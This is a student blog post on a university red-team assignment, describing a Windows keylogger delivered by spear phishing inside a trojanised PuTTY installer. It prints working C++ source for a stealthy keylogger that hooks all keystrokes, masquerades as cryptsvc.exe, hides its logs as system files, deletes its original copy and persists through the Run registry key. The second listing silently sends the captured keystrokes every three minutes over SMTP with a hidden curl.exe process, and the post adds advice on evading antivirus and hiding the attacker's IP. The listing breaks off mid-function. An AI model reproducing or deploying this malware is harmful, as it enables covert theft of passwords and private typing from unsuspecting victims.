---
layout: post
title: "Red Team Project - Windows keylogger"
author: "Michał Kozłowski"
tags: Cybersecurity
---

This blog post is about my RED Team keylogger assignment for an university class. The purpose of this project was to understand how simple windows keylogger is made, as well as to learn the MITRE ATT&CK threat model. I was able to make a keylogger that works on updated windows 11 system with windows defender security features enabled (as of 28.05.2026). It was also an opportunity for me to test out the current AI models for red teaming tasks in cybersecurity. The university task outlined minimal requirements for a keylogging program which I met.

---
**Red Team Project - Windows keylogger**
- [Initial access](#initial-access)
- [Execution](#execution)
- [Persistence](#persistence)
- [Stealth](#stealth)
  - [Masquerading (T1036)](#masquerading-t1036)
  - [Initial installation](#initial-installation)
- [Functionality](#functionality)
- [Exfiltrating data](#exfiltrating-data)
- [Anonymity](#anonymity)
- [Deep dive into keylogging](#deep-dive-into-keylogging)
- [Code](#code)
  - [Basic keylogger](#basic-keylogger)
  - [Keylogger with SMTP data exfiltration](#keylogger-with-smtp-data-exfiltration)
  - [Full installer script](#full-installer-script)
- [AI Use](#ai-use)
- [Interesting links](#interesting-links)

---

# Initial access

As a mean of [initial access](https://attack.mitre.org/tactics/TA0001/) I decided to select [spear phishing](https://attack.mitre.org/techniques/T1566/002/) email containing malicious executable. Email is still a popular way of initial access because it is universal, cheap, scalable, and embedded in every business workflow. Attacker can deliver the malware directly to a target without complicated identity hiding infrastructure. The downside of using email is that the amount of security layers added to email clients, email servers and browsers over the years has been rising. Some of that include:

- Browsers blocking / warning about executable file downloads ([chrome](https://support.google.com/chrome/answer/6261569?hl=en), [firefox](https://support.mozilla.org/en-US/kb/how-does-phishing-and-malware-protection-work))
- Email clients warning about executable attachments
- Content filters for email servers blocking suspicious attachments ([microsoft](https://learn.microsoft.com/en-us/exchange/antispam-and-antimalware/antispam-protection/attachment-filtering))
- Email servers scanning attachments for viruses ([google](https://support.google.com/mail/answer/25760?hl=en#zippy=%2Cvirus-in-an-email-youre-sending%2Cvirus-in-an-email-sent-to-you))

Those features can be potentially bypassed. Most email sites warn you about executable files but doesn't about zip archives. Files can also be hosted on third party websites like `wetransfer.com` and a link can be provided in the email instead of an attachment.

# Execution

User Execution of a malicious file ([T1204.002](https://attack.mitre.org/techniques/T1204/002/)), that means tricking the target into launching the program for you. In my case malicious executable is bundled with benign software installer - I selected Putty. This method lowers the targets wariness as after running the file user is presented with an expected behavior - the installation succeeds. Installer alongside normal program also installs the spyware.

![]({{ "assets/images/keylogger/putty_installer.png" | relative_url }}) 

Installer can be made trivially using ready installation systems like [Inno Setup](https://jrsoftware.org/isinfo.php). There are several upsides of creating installer like this. First of all user has no idea about the malware and is not suspicious after running it. And most importantly installer obfuscates the malicious payload by compressing it and joining with benign software. This can be seen when analyzing both samples on `virustotal`.

![]({{ "assets/images/keylogger/virustotal_base.png" | relative_url }}) 
[virustotal](https://www.virustotal.com/gui/file/3abaf5a49c251790dca30ba0ee66ae275ee3db560404544a95e764595bdd0722) analysis result for base payload after 6 days

![]({{ "assets/images/keylogger/virustotal_installer.png" | relative_url }}) 
imidiate [virustotal](https://www.virustotal.com/gui/file/2e32bdfe0e7d865897e4bdab9de42a23c2c4c026066519305203127a7d30d863/detection) result of a scan for a payload bundled in an installer.

What is interesting, is that the immediate scan showed 4/71 detections for installer (as seen in the image) and 23/70 detections for a payload. Since then the results have been updated. I am not sure why, but it is probably a result of active/behavioral analysis taking more time. Right now virus total is showing 25/66 detections for installer which is still less then 40/70 but less impressive then I initially thought.

I have also noticed that browsers are less commonly blocking installer software from downloading then simple executables. I am not certain why.

Bundling malicious file in an installer is very simple, here is a fragment of an installation script for `inno setup`:

```
[Files]
              bening software like Putty ---v
Source: "C:\Users\ONiIK\Downloads\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\ONiIK\Desktop\cryptsvc.exe"; DestDir: "{app}"; Flags: ignoreversion
								 ^--- malicious executable
. . .

[Run]
Filename: "{app}\{#MyAppExeName}"; Flags: nowait postinstall
Filename: "{app}\cryptsvc.exe"; Flags: nowait runhidden
					^--- run the malicious file after installation without asking the user
```

# Persistence 

Malicious payload launched by the installer edits the windows registry. And sets the user level persistance. Each time the user logs-in malicious program is launched. This persistence is achieved without need for administrative rights.

| Registry Path                                        | Scope             | Privileges Required |
| ---------------------------------------------------- | ----------------- | :------------------ |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user only | User-level          |

# Stealth

## Masquerading (T1036)

In order to hide malicious intent of a software attacker can use [Masquerading](https://attack.mitre.org/techniques/T1036/). I decided that my payload will impersonate `cryptsvc.exe`, this is because:

- Cryptographic Services (CryptSvc) is a genuine microsoft service
- cryptographic service writing to `%AppData%\Microsoft\Crypto\Keys` is not suspicious
- searching phrase *"is cryptsvc.exe a virus"* or other similar on google results in posts explaining it is a benign process

I decided to hide log files in `%AppData%\Microsoft\Crypto\Keys`, this directory holds keys used by *Windows Cryptography Next Generation (CNG)* to store user private keys for cryptographic operations. I chose this directory because the files have cryptic names (hashes of the key container names), no file extensions, and are marked as system files. This combination is making it very hard for uninformed user to accidentally find, and raise any suspicions about the file presence and origins.

```cpp
SetFileAttributesA("C:\\path\\to\\file", FILE_ATTRIBUTE_SYSTEM);
```

## Initial installation

Payload named `cryptsvc.exe` [T1036.005](https://attack.mitre.org/techniques/T1036/005/) after beeing launched by the installer, copies itself to a `%appdata%\Microsoft\Crypto`. It sets its attributes to `system` and `hidden`, meaning user has to enable both of those options in `exporer/view/folder options/view/advanced settings` just to see the malicous file [T1564.001](https://attack.mitre.org/techniques/T1564/001/). It then relaunches the copy and deletes [T1070.004](https://attack.mitre.org/techniques/T1070/004/) the original payload from installation directory.

![]({{ "assets/images/keylogger/view_options.png" | relative_url }}) 

# Functionality 

Payload injects a low level windows keyboard hook. Each key press is logged to a temp file in located in `%appdata%\Microsoft\Crypto\Keys` path. This path mimics the bahaviour of an app using standard cryptography key storage, and is in line with the masquarading attempt as cryptography service.

Fragment of a log file captured by a key logger

```txt
[2026-05-20 21:48:55] INFO: Keylogger started
[2026-05-20 21:48:56] [Left Win]
[2026-05-20 21:49:06] [n]
[2026-05-20 21:49:18] [o]
[2026-05-20 21:49:18] [t]
[2026-05-20 21:49:18] [e]
[2026-05-20 21:49:19] [Enter]
[2026-05-20 21:49:19] [t]
[2026-05-20 21:49:19] [h]
[2026-05-20 21:49:19] [i]
[2026-05-20 21:49:19] [s]
[2026-05-20 21:49:20] [Space]
[2026-05-20 21:49:20] [i]
[2026-05-20 21:49:20] [s]
[2026-05-20 21:49:21] [Space]
[2026-05-20 21:49:21] [a]
[2026-05-20 21:49:21] [Space]
[2026-05-20 21:49:21] [t]
[2026-05-20 21:49:22] [e]
[2026-05-20 21:49:22] [s]
```

# Exfiltrating data 

Data exfiltration is achieved with a SMTP protocol. Message is sent using `curl.exe`. Mail message is constructed properly to not flag any spam filters or other security features on the mail server. There are multiple sites like `interia.pl` `wp.pl` that allow signups without any personal data. Those services can be used for data exfiltration.

Mail construction:

```cpp
    fprintf(eml, "From: <%s>\r\n", FROM_EMAIL);
    fprintf(eml, "To: <%s>\r\n", TO_EMAIL);
    fprintf(eml, "Subject: Wiadomosc od szczura\r\n");
    fprintf(eml, "MIME-Version: 1.0\r\n");
    fprintf(eml, "Content-Type: multipart/mixed; boundary=\"X-BOUNDARY\"\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "--X-BOUNDARY\r\n");
    fprintf(eml, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "A\r\n");
    fprintf(eml, "--X-BOUNDARY\r\n");
    fprintf(eml, "Content-Type: application/octet-stream; name=\"log.txt\"\r\n");
    fprintf(eml, "Content-Disposition: attachment; filename=\"log.txt\"\r\n");
    fprintf(eml, "Content-Transfer-Encoding: base64\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "%s\r\n", b64);
    fprintf(eml, "--X-BOUNDARY--\r\n");
    fclose(eml);
```

Silent `curl.exe` mail send

```cpp
 char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char curlPath[MAX_PATH];
    snprintf(curlPath, MAX_PATH, "%s\\curl.exe", sys32);

    if (GetFileAttributesA(curlPath) == INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(emlPath);
        return;
    }

    char args[4096];
    snprintf(args, sizeof(args),
        "--silent --show-error --url \"smtps://%s:%d\" "
        "--mail-from \"%s\" --mail-rcpt \"%s\" --user \"%s:%s\" "
        "--upload-file \"%s\"",
        SMTP_SERVER, SMTP_PORT, FROM_EMAIL, TO_EMAIL, SMTP_USER, SMTP_PASS, emlPath);

    char cmdLine[8192];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", curlPath, args);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    BOOL created = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```



# Anonymity 

Lets look at the attack scenario:

![]({{ "assets/images/keylogger/attack_scenario.svg" | relative_url }}) 

As you can see, the attacker has two points of contact with the system. First initiating the attack by sending the email, and then retrieving the data from the mail server. For both of those operations attacker needs to hide his IP. Not doing so would mean that route could be traced back from the malicious mail address to the attacker. Hiding the IP can be done  by using a trusted VPN service or tor network.

# Deep dive into keylogging

Payload installs a system-wide low-level keyboard hook using `SetWindowsHookEx(WH_KEYBOARD_LL, ...)` to intercept keystrokes before they reach applications. Inside the `KeyboardProc` callback, it reads the virtual key code from the `KBDLLHOOKSTRUCT` and polls modifier states with `GetAsyncKeyState` to build human-readable key combinations. The hook relies on a standard Windows message pump (`GetMessage`/`DispatchMessage`) running in the main thread, because low-level hooks are dispatched through that thread's message queue. Each captured key is formatted with a timestamp and written to a log file inside `%APPDATA%`, where `SetFileAttributes` is used to hide the file by marking it with the system attribute. A critical section protects file access from re-entrant hook callbacks, and the use of `WinMain` with the `-mwindows` linker flag prevents a console window from appearing.

Below are the minimal Windows API patterns used to reproduce the underlying mechanics. These snippets illustrate the primitives for security research and defensive tooling.

**Installing and removing a low-level hook**

Note: installing the `WH_KEYBOARD_LL` keyboard hook by application is marked by some anti-virus software as malicious. 

```cpp
#include <windows.h>

// Installation (must be in a thread that later runs a message loop)
HHOOK hHook = SetWindowsHookEx(
    WH_KEYBOARD_LL,
    KeyboardProc,
    GetModuleHandle(NULL),
    0
);

// Cleanup before exit
UnhookWindowsHookEx(hHook);
```

**Hook callback**

A low-level keyboard hook procedure must accept three parameters and forward the event.

```cpp
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        WORD vk = pKbd->vkCode; // virtual-key code
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

**Message pump requirement**

`WH_KEYBOARD_LL` callbacks are dispatched on the installing thread, so an active message loop is mandatory.

```cpp
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}
```

**Mapping keys**

In order to map keycode values to readable format simple switch case is constructed

```cpp
char keyName[64] = {0};
        switch (vk) {
            case VK_SPACE:      strcpy(keyName, "Space"); break;
            case VK_RETURN:     strcpy(keyName, "Enter"); break;
            case VK_ESCAPE:     strcpy(keyName, "Esc"); break;
            case VK_DELETE:     strcpy(keyName, "Delete"); break;
            case VK_BACK:       strcpy(keyName, "BackSpace"); break;
            case VK_TAB:        strcpy(keyName, "Tab"); break;
            case VK_HOME:       strcpy(keyName, "Home"); break;
            case VK_END:        strcpy(keyName, "End"); break;
                
            . . .
            and so on all needed keys

```

default case is handeling keys that can be mapped programaticly like numbers 0-9 big and small letters a-z.

```cpp
default:
                if (vk >= 0x30 && vk <= 0x39) {
                    sprintf(keyName, "%c", (char)vk); // 0-9
                } else if (vk >= 0x41 && vk <= 0x5A) {
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                        sprintf(keyName, "%c", (char)vk); // A-Z
                    else
                        // a-z
                        sprintf(keyName, "%c", (char)(vk + 32));
                } else {
                    // unhnadled case print vk value instead
                    sprintf(keyName, "0x%02X", vk);
                }

```

**Checking modifier keys**

Modifier keys can be used in shortcuts like `Ctrl+C` `Win+L`, special characters `Shift+5`  or language characters `Alt+L` `Alt+N`. They need to be tracked separatly from main switch case.

```cpp
bool ctrlDown  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
bool altDown   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
bool shiftDown = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
```

# Code

Implementing a keylogger on systems you do not own or without explicit authorization is illegal and unethical. **Code provided only for educational purposes.**

## Basic keylogger

```cpp
#include <windows.h>
#include <stdio.h>
#include <time.h>

#define LOG_FILE_LOCATION "\\Microsoft\\Crypto\\Keys"
#define LOG_FILE_NAME "\\29e5d16242sds13e5c6c29e4545fgv_6dc132e6-ad1d-4504-abcc-d95122430caa"

HHOOK g_hHook = NULL;
CRITICAL_SECTION g_logCS;
char g_logPath[MAX_PATH];

void LogMessage(const char* msg) {
    EnterCriticalSection(&g_logCS);
    FILE* f = fopen(g_logPath, "a");
    if (f) {
        time_t now = time(NULL);
        struct tm* tm_info = localtime(&now);
        char timeBuf[64];
        strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%d %H:%M:%S", tm_info);
        fprintf(f, "[%s] %s\n", timeBuf, msg);
        fclose(f);
    }
    LeaveCriticalSection(&g_logCS);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        WORD vk = pKbd->vkCode;

        // Windows key
        if (vk == VK_LWIN) { LogMessage("[Left Win]"); return CallNextHookEx(g_hHook, nCode, wParam, lParam); }
        
        // Build combo prefix
        bool ctrlDown = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool altDown = GetAsyncKeyState(VK_MENU) & 0x8000;
        char combo[128] = {0};
        if (ctrlDown) strcat(combo, "Ctrl+");
        if (altDown) strcat(combo, "Alt+");
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) strcat(combo, "Shift+");
        if ((GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000)) strcat(combo, "Win+");
        
        // Key names
        char keyName[64] = {0};
        switch(vk) {
            case VK_SPACE: strcpy(keyName, "Space"); break;
            case VK_RETURN: strcpy(keyName, "Enter"); break;
            case VK_ESCAPE: strcpy(keyName, "Esc"); break;
            case VK_DELETE: strcpy(keyName, "Delete"); break;
            case VK_BACK: strcpy(keyName, "BackSpace"); break;
            case VK_TAB: strcpy(keyName, "Tab"); break;
            case VK_HOME: strcpy(keyName, "Home"); break;
            case VK_END: strcpy(keyName, "End"); break;
            case VK_INSERT: strcpy(keyName, "Insert"); break;
            case VK_SNAPSHOT: strcpy(keyName, "Print Screen"); break;
            case VK_CAPITAL: strcpy(keyName, "Caps Lock"); break;
            case VK_LEFT: strcpy(keyName, "Left Arrow"); break;
            case VK_UP: strcpy(keyName, "Up Arrow"); break;
            case VK_RIGHT: strcpy(keyName, "Right Arrow"); break;
            case VK_DOWN: strcpy(keyName, "Down Arrow"); break;
            case VK_OEM_3: strcpy(keyName, "~`"); break;
            case VK_OEM_4: strcpy(keyName, "{["); break;
            case VK_OEM_6: strcpy(keyName, "}]"); break;
            case VK_OEM_1: strcpy(keyName, ":;"); break;
            case VK_OEM_7: strcpy(keyName, "\"'"); break;
            case VK_OEM_COMMA: strcpy(keyName, ",<"); break;
            case VK_OEM_PERIOD: strcpy(keyName, ".>"); break;
            case VK_OEM_2: strcpy(keyName, "/?"); break;
            case VK_OEM_5: strcpy(keyName, "|\\"); break;
            case VK_OEM_MINUS: strcpy(keyName, "_-"); break;
            case VK_OEM_PLUS: strcpy(keyName, "=+"); break;
            default:
                if (vk >= 0x30 && vk <= 0x39) {
                    sprintf(keyName, "%c", (char)vk);
                } else if (vk >= 0x41 && vk <= 0x5A) {
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                        sprintf(keyName, "%c", (char)vk);
                    else
                        sprintf(keyName, "%c", (char)(vk + 32));
                } else {
                    sprintf(keyName, "0x%02X", vk);
                }
        }
        
        char msg[512];
        if (strlen(combo) > 0) {
            combo[strlen(combo)-1] = '\0';
            snprintf(msg, sizeof(msg), "[%s+%s]", combo, keyName);
        } else {
            snprintf(msg, sizeof(msg), "[%s]", keyName);
        }
        
        LogMessage(msg);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Set log path to %APPDATA% (no admin rights needed)
    GetEnvironmentVariableA("APPDATA", g_logPath, MAX_PATH);
    strcat(g_logPath, LOG_FILE_LOCATION);
    strcat(g_logPath, LOG_FILE_NAME);

    // Set system file attribiute to hide
    SetFileAttributesA(g_logPath, FILE_ATTRIBUTE_SYSTEM);
    
    InitializeCriticalSection(&g_logCS);
    
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        return 1;
    }
    
    LogMessage("INFO: Keylogger started");
    
    // Hidden message pump
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(g_hHook);
    DeleteCriticalSection(&g_logCS);
    return 0;
}
```

## Keylogger with SMTP data exfiltration

```cpp
// g++ -o cryptsvc.exe smtp_keylogger.cpp -static-libgcc -luser32 -ladvapi32 -lshell32 -O2 -std=c++11 -mwindows

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#define EXE_FILE_LOCATION "\\Microsoft\\Crypto"
#define EXE_FILE_NAME     "cryptsvc.exe"
#define LOG_FILE_LOCATION "\\Microsoft\\Crypto\\Keys"
#define LOG_FILE_NAME     "\\29e5d13-0e7c-4fadb3a51f8a7901d2ad13e5c695-a194-8b7674de7c662_7ccdfca3"

#define TO_EMAIL     "your_username@interia.eu"
#define FROM_EMAIL   "your_username@interia.eu"
#define SMTP_SERVER  "poczta.interia.pl"
#define SMTP_PORT    465
#define SMTP_USER    "your_username@interia.eu"
#define SMTP_PASS    "your_secret_password"

HHOOK g_hHook = NULL;
CRITICAL_SECTION g_logCS;
char g_logPath[MAX_PATH] = {0};

void LogMessage(const char* msg) {
    EnterCriticalSection(&g_logCS);
    FILE* f = fopen(g_logPath, "a");
    if (f) {
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        char buf[64];
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", t);
        fprintf(f, "[%s] %s\n", buf, msg);
        fclose(f);
    }
    LeaveCriticalSection(&g_logCS);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        WORD vk = pKbd->vkCode;

        if (vk == VK_LWIN) {
            LogMessage("[Left Win]");
            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
        }

        bool ctrlDown = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool altDown  = GetAsyncKeyState(VK_MENU)     & 0x8000;
        char combo[128] = {0};
        if (ctrlDown) strcat(combo, "Ctrl+");
        if (altDown)  strcat(combo, "Alt+");
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) strcat(combo, "Shift+");
        if ((GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000)) strcat(combo, "Win+");

        char keyName[64] = {0};
        switch (vk) {
            case VK_SPACE:      strcpy(keyName, "Space"); break;
            case VK_RETURN:     strcpy(keyName, "Enter"); break;
            case VK_ESCAPE:     strcpy(keyName, "Esc"); break;
            case VK_DELETE:     strcpy(keyName, "Delete"); break;
            case VK_BACK:       strcpy(keyName, "BackSpace"); break;
            case VK_TAB:        strcpy(keyName, "Tab"); break;
            case VK_HOME:       strcpy(keyName, "Home"); break;
            case VK_END:        strcpy(keyName, "End"); break;
            case VK_INSERT:     strcpy(keyName, "Insert"); break;
            case VK_SNAPSHOT:   strcpy(keyName, "Print Screen"); break;
            case VK_CAPITAL:    strcpy(keyName, "Caps Lock"); break;
            case VK_LEFT:       strcpy(keyName, "Left Arrow"); break;
            case VK_UP:         strcpy(keyName, "Up Arrow"); break;
            case VK_RIGHT:      strcpy(keyName, "Right Arrow"); break;
            case VK_DOWN:       strcpy(keyName, "Down Arrow"); break;
            case VK_OEM_3:      strcpy(keyName, "~`"); break;
            case VK_OEM_4:      strcpy(keyName, "{["); break;
            case VK_OEM_6:      strcpy(keyName, "}]"); break;
            case VK_OEM_1:      strcpy(keyName, ":;"); break;
            case VK_OEM_7:      strcpy(keyName, "\"'"); break;
            case VK_OEM_COMMA:  strcpy(keyName, ",<"); break;
            case VK_OEM_PERIOD: strcpy(keyName, ".>"); break;
            case VK_OEM_2:      strcpy(keyName, "/?"); break;
            case VK_OEM_5:      strcpy(keyName, "|\\"); break;
            case VK_OEM_MINUS:  strcpy(keyName, "_-"); break;
            case VK_OEM_PLUS:   strcpy(keyName, "=+"); break;
            default:
                if (vk >= 0x30 && vk <= 0x39) {
                    sprintf(keyName, "%c", (char)vk);
                } else if (vk >= 0x41 && vk <= 0x5A) {
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                        sprintf(keyName, "%c", (char)vk);
                    else
                        sprintf(keyName, "%c", (char)(vk + 32));
                } else {
                    sprintf(keyName, "0x%02X", vk);
                }
        }

        char msg[512];
        if (strlen(combo) > 0) {
            combo[strlen(combo)-1] = '\0';
            snprintf(msg, sizeof(msg), "[%s+%s]", combo, keyName);
        } else {
            snprintf(msg, sizeof(msg), "[%s]", keyName);
        }
        LogMessage(msg);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void SelfDeleteOriginal(const char* origPath) {
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    char batPath[MAX_PATH];
    snprintf(batPath, MAX_PATH, "%sselfdel.bat", tmpDir);

    FILE* b = fopen(batPath, "w");
    if (b) {
        fprintf(b,
            "@echo off\n"
            ":loop\n"
            "del \"%s\" >nul 2>&1\n"
            "if exist \"%s\" goto loop\n"
            "del \"%%~f0\" >nul 2>&1\n", origPath, origPath);
        fclose(b);
        ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);
    }
}

static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* in, size_t len, char* out) {
    size_t i = 0, j = 0;
    unsigned char arr3[3], arr4[4];
    size_t idx = 0;

    while (len--) {
        arr3[i++] = *(in++);
        if (i == 3) {
            arr4[0] = (arr3[0] & 0xfc) >> 2;
            arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
            arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
            arr4[3] = arr3[2] & 0x3f;
            for (int k = 0; k < 4; k++) out[idx++] = b64_chars[arr4[k]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) arr3[j] = '\0';
        arr4[0] = (arr3[0] & 0xfc) >> 2;
        arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
        arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
        for (j = 0; j < (i + 1); j++) out[idx++] = b64_chars[arr4[j]];
        while (i++ < 3) out[idx++] = '=';
    }
    out[idx] = '\0';
}

void SendLogViaSMTP() {
    EnterCriticalSection(&g_logCS);
    FILE* test = fopen(g_logPath, "rb");
    if (!test) {
        LeaveCriticalSection(&g_logCS);
        return;
    }
    fseek(test, 0, SEEK_END);
    long sz = ftell(test);
    if (sz <= 0) {
        fclose(test);
        LeaveCriticalSection(&g_logCS);
        return;
    }
    fseek(test, 0, SEEK_SET);
    char* raw = (char*)malloc(sz);
    if (!raw) {
        fclose(test);
        LeaveCriticalSection(&g_logCS);
        return;
    }
    fread(raw, 1, sz, test);
    fclose(test);
    LeaveCriticalSection(&g_logCS);
    size_t b64len = ((size_t)sz + 2) / 3 * 4 + 1;
    char* b64 = (char*)malloc(b64len);
    if (!b64) {
        free(raw);
        return;
    }
    base64_encode((const unsigned char*)raw, (size_t)sz, b64);
    free(raw);

    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    char emlPath[MAX_PATH];
    snprintf(emlPath, MAX_PATH, "%smail_%lu.eml", tmpDir, GetTickCount());

    FILE* eml = fopen(emlPath, "w");
    if (!eml) {
        free(b64);
        return;
    }
    fprintf(eml, "From: <%s>\r\n", FROM_EMAIL);
    fprintf(eml, "To: <%s>\r\n", TO_EMAIL);
    fprintf(eml, "Subject: Wiadomosc od szczura\r\n");
    fprintf(eml, "MIME-Version: 1.0\r\n");
    fprintf(eml, "Content-Type: multipart/mixed; boundary=\"X-BOUNDARY\"\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "--X-BOUNDARY\r\n");
    fprintf(eml, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "A\r\n");
    fprintf(eml, "--X-BOUNDARY\r\n");
    fprintf(eml, "Content-Type: application/octet-stream; name=\"log.txt\"\r\n");
    fprintf(eml, "Content-Disposition: attachment; filename=\"log.txt\"\r\n");
    fprintf(eml, "Content-Transfer-Encoding: base64\r\n");
    fprintf(eml, "\r\n");
    fprintf(eml, "%s\r\n", b64);
    fprintf(eml, "--X-BOUNDARY--\r\n");
    fclose(eml);
    free(b64);

    char sys32[MAX_PATH];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char curlPath[MAX_PATH];
    snprintf(curlPath, MAX_PATH, "%s\\curl.exe", sys32);

    if (GetFileAttributesA(curlPath) == INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(emlPath);
        return;
    }

    char args[4096];
    snprintf(args, sizeof(args),
        "--silent --show-error --url \"smtps://%s:%d\" "
        "--mail-from \"%s\" --mail-rcpt \"%s\" --user \"%s:%s\" "
        "--upload-file \"%s\"",
        SMTP_SERVER, SMTP_PORT, FROM_EMAIL, TO_EMAIL, SMTP_USER, SMTP_PASS, emlPath);

    char cmdLine[8192];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", curlPath, args);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    BOOL created = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (!created) {
        DeleteFileA(emlPath);
        return;
    }

    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000);
    DWORD exitCode = 0;
    if (waitResult == WAIT_OBJECT_0)
        GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (waitResult == WAIT_OBJECT_0 && exitCode == 0) {
        EnterCriticalSection(&g_logCS);
        DeleteFileA(g_logPath);
        LeaveCriticalSection(&g_logCS);
		FILE* f = fopen(g_logPath, "a");
		fclose(f);
		SetFileAttributesA(g_logPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    DeleteFileA(emlPath);
}

DWORD WINAPI SendThreadProc(LPVOID lpParam) {
    (void)lpParam;
    while (1) {
        Sleep(180000);
        SendLogViaSMTP();
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    InitializeCriticalSection(&g_logCS);

    char appData[MAX_PATH];
    if (!GetEnvironmentVariableA("APPDATA", appData, MAX_PATH)) {
        DeleteCriticalSection(&g_logCS);
        return 1;
    }

    char installDir[MAX_PATH], installPath[MAX_PATH], logDir[MAX_PATH];
    snprintf(installDir, MAX_PATH, "%s%s", appData, EXE_FILE_LOCATION);
    CreateDirectoryA(installDir, NULL);

    snprintf(installPath, MAX_PATH, "%s\\%s", installDir, EXE_FILE_NAME);
    snprintf(logDir, MAX_PATH, "%s%s", appData, LOG_FILE_LOCATION);
    CreateDirectoryA(logDir, NULL);

    snprintf(g_logPath, MAX_PATH, "%s%s", logDir, LOG_FILE_NAME);
    SetFileAttributesA(g_logPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    bool isInstalled = (lstrcmpiA(currentPath, installPath) == 0);
	
    if (!isInstalled) {
        if (GetFileAttributesA(installPath) != INVALID_FILE_ATTRIBUTES) {
            ShellExecuteA(NULL, "open", installPath, NULL, NULL, SW_HIDE);
            DeleteCriticalSection(&g_logCS);
            return 0;
        }

        if (!CopyFileA(currentPath, installPath, FALSE)) {
            DeleteCriticalSection(&g_logCS);
            return 1;
        }
